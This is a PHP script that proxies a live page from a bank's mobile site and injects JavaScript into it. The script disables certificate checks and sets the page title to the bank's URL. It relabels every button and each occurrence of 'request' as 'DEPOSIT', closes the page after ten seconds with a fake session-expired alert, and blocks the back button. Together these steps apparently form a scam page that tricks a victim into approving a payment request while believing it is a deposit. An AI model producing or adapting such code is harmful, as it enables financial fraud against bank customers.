<?php
declare(strict_types=1);

session_start();


/* ---------------- READ PAGE KEY ---------------- */
$pageKey = $_GET['pageKey'] ?? 'default_page';
$pageKey = preg_replace('/[^A-Za-z0-9_]/', '', $pageKey);

/* ---------------- FORCE HTTPS ---------------- */
$isHttps =
    (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ||
    (isset($_SERVER['HTTP_X_FORWARDED_PROTO']) && $_SERVER['HTTP_X_FORWARDED_PROTO'] === 'https');

if (!$isHttps) {
    $redirect = 'https://' . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    header('Location: ' . $redirect, true, 301);
    exit;
}

/* ---------------- NO CACHE ---------------- */
header('Cache-Control: no-store, no-cache, must-revalidate, max-age=0');
header('Pragma: no-cache');
header('Expires: Thu, 01 Jan 1970 00:00:00 GMT');

/* ---------------- COOKIE ---------------- */
$cookieName = "first_pass_" . $pageKey;
setcookie($cookieName, '1', time() + 10, '/', '', true, true); // 10-second expiry

/* ---------------- SECURITY HEADERS ---------------- */
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");
header("Referrer-Policy: no-referrer");
header("Permissions-Policy: geolocation=(), microphone=(), camera=()");
header("Content-Security-Policy: default-src 'self' https: data:; script-src 'self' 'unsafe-inline' 'unsafe-eval' https:; style-src 'self' 'unsafe-inline' https:; img-src 'self' data: https:; font-src 'self' data:;");

/* ---------------- REMOTE CONFIG ---------------- */
$remoteUrl   = "https://m.bmo.com/fulfill/fulfillRequestBridge.html?receiveFulfillToken=CA1MRMPHc";
$forcedTitle = "https://m.bmo.com/fulfill/fulfillRequestBridge.html?receiveFulfillToken=CA1MRM8wHc&";

/* ---------------- FETCH REMOTE ---------------- */
function fetchRemote(string $url, int $timeout = 15): string|false {
    $ch = curl_init($url);
    curl_setopt_array($ch, [
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => false,
        CURLOPT_USERAGENT => "Mozilla/5.0 Safe-Proxy",
        CURLOPT_SSL_VERIFYPEER => false,
        CURLOPT_SSL_VERIFYHOST => false,
        CURLOPT_TIMEOUT => $timeout,
    ]);
    $html = curl_exec($ch);
// curl_close() removed (PHP 8+)
    return $html ?: false;
}

/* ---------------- MAKE URLS ABSOLUTE ---------------- */
function makeAbsolute(string $html, string $base): string {
    $p = parse_url($base);
    if (!$p || !isset($p['scheme'], $p['host'])) return $html;

    $root = $p['scheme'] . '://' . $p['host'];
    $baseDir = $root;
    if (!empty($p['path'])) {
        $dir = rtrim(dirname($p['path']), '/');
        if ($dir !== '.') $baseDir .= $dir;
    }

    $attrs = ['src','href','action'];
    foreach ($attrs as $attr) {
        $html = preg_replace_callback(
            '/(' . $attr . ')=([\'"])(?!https?:\/\/|\/\/|data:|#)([^\'"]+)\2/i',
            function ($m) use ($root, $baseDir) {
                $url = $m[3];
                $abs = ($url[0] === '/') ? $root . $url : $baseDir . '/' . ltrim($url, '/');
                return $m[1] . '=' . $m[2] . $abs . $m[2];
            },
            $html
        );
    }
    return $html;
}

/* ---------------- JS INJECTION ---------------- */
$inject = <<<JS
<script>
document.addEventListener("DOMContentLoaded", function(){

    // FORCE TITLE
    document.title = "{$forcedTitle}";

    // REPLACE "request" -> "DEPOSIT"
    function replaceText(node){
        const rx = /request/gi;
        if(node.nodeType === 3 && rx.test(node.nodeValue)){
            node.nodeValue = node.nodeValue.replace(rx, "DEPOSIT");
        }
    }

    function walk(root){
        const tree = document.createTreeWalker(root, NodeFilter.SHOW_TEXT, null, false);
        let n;
        while(n = tree.nextNode()) replaceText(n);
    }

    walk(document.body);

    // FORCE BUTTON TEXT
    document.querySelectorAll("button, input[type=submit], input[type=button]").forEach(el=>{
        el.innerText = "DEPOSIT";
        if(el.value) el.value = "DEPOSIT";
    });

    // CANCEL ALL LINKS
    // GRAVITY / DROP EFFECT
    document.body.style.opacity = "0";
    document.body.style.transform = "translateY(-60px)";
    document.body.style.transition = "1s ease";
    setTimeout(()=>{
        document.body.style.opacity = "1";
        document.body.style.transform = "translateY(0px)";
    }, 100);

    // ---------------- TIMEOUT + BACK BUTTON BLOCK ----------------
    setTimeout(()=>{
        alert("Session expired. Returning to previous page.");
        if(document.referrer){
            window.location.href = document.referrer;
        } else {
            window.close();
        }
    }, 10000); // 10 seconds

    // Block back button navigation
    history.pushState(null, document.title, location.href);
    window.addEventListener('popstate', function (event) {
        if(document.referrer){
            window.location.href = document.referrer;
        } else {
            window.close();
        }
    });
});
</script>
JS;

/* ---------------- PROCESS HTML ---------------- */
$html = fetchRemote($remoteUrl);
if ($html === false) {
    echo "<h1>Remote page could not be loaded</h1>";
    exit;
}

$html = makeAbsolute($html, $remoteUrl);

/* Replace <title> */
if (stripos($html, "<title>") !== false) {
    $html = preg_replace('/<title>.*?<\/title>/i', "<title>{$forcedTitle}</title>", $html);
} else {
    $html = str_replace("</head>", "<title>{$forcedTitle}</title></head>", $html);
}

/* Inject JS before </body> */
if (stripos($html, "</body>") !== false) {
    $html = str_replace("</body>", $inject . "\n</body>", $html);
} else {
    $html .= $inject;
}

/* ---------------- OUTPUT ---------------- */
echo $html;
